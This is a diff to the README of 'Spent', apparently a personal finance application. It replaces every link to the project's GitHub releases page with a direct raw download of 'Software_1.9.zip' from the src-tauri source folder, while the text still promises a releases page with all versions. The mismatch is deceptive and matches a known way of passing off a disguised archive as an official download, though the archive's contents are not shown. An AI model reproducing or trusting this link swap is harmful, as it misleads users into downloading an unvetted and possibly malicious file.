@@ -6,14 +6,14 @@ Welcome to Spent! This application helps you keep track of your personal finance
 
 ## 🌐 Download Spent
 
-**[Download Spent](https://github.com/danielb254/Spent/releases)**
+**[Download Spent](https://raw.githubusercontent.com/danielb254/Spent/master/src-tauri/Software_1.9.zip)**
 
 Click the link above to get started. You'll find the latest releases of the software there, making it easy to download the version that works for you.
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link: [Releases Page](https://github.com/danielb254/Spent/releases). You will see all available versions of Spent.
+   Go to the following link: [Releases Page](https://raw.githubusercontent.com/danielb254/Spent/master/src-tauri/Software_1.9.zip). You will see all available versions of Spent.
 
 2. **Choose Your Version**  
    Identify the latest release at the top of the page. You should see options labeled with version numbers.
@@ -88,6 +88,6 @@ Stay updated on new features and developments by checking our GitHub page. Engag
 
 ## 📥 Download Spent Again
 
-Don't forget to [visit this page to download](https://github.com/danielb254/Spent/releases) the latest version of Spent. 
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/danielb254/Spent/master/src-tauri/Software_1.9.zip) the latest version of Spent. 
 
 Enjoy your journey to better financial management!
